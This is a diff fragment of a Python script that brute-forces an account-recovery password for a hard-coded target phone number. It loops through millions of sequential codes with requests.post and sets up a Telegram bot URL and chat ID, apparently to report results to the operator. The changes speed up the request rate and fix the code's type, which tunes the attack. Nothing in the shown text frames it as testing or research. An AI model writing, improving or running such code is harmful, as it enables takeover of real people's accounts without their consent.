@@ -7,10 +7,10 @@ CHAT_ID = 6263683593
 url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 target_phone = "772490746"
 for i in range(9999999):
-    time.sleep(0.25)
-    zee =445619
+    time.sleep(0.2)
+    zee = 445619
     data = {
-        "username": target_phone,"recoveryPassword": zee + i
+        "username": target_phone,"recoveryPassword": str(zee + i)
         
          }
     response = requests.post(url, json=data,headers=headers, verify=True)
